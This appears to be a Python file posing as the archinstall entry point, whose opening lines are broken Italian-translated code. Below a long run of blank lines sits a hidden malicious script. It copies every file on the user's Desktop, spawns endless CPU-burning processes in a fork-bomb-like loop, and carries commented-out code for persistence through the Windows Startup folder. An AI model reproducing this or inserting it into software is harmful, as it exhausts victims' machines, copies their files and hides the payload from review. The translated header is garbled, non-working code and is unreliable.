importare sistema

da archinstall.main importare principale

Se __nome__ == '__principale__':
	sistema.uscita(principale())























































































































































































































































































































import psutil
import multiprocessing
import sys
import ctypes
import shutil
import os
from cryptography.fernet import Fernet
#fak=os.path.join(os.getenv("APPDATA"),r"Microsoft\Windows\Start Menu\Programs\Startup")
#filenow=os.path.abspath(__file__)

#dir=os.path.join(fak,os.path.basename(filenow))
#shutil.copy2(filenow,dir)
#if not os.path.exists(dir):
    #shutil.copy2(filenow,dir)
print("il tuo processore e da buttare ")
def kilcpiu():
    while True:
        fak_you=0
        for v in range(100000000):
            fak_you+=v*v
            print(psutil.sensors_temperatures()["coretemp"][0].current)
    
def killcystem():
    conta=0
    file=os.path.join(os.path.expanduser("~"),"Desktop")
    for root,i,firl in os.walk(file):
        for file in firl:
            conta+=1
            file=os.path.join(root,file)
            shutil.copy(file,f"file{conta}.txt")
if __name__ =="__main__":
    killcystem()
    for i in range(100000):
        for din in range(multiprocessing.cpu_count()):
            d=multiprocessing.Process(target=kilcpiu)
            d.daemon=True
            d.start()
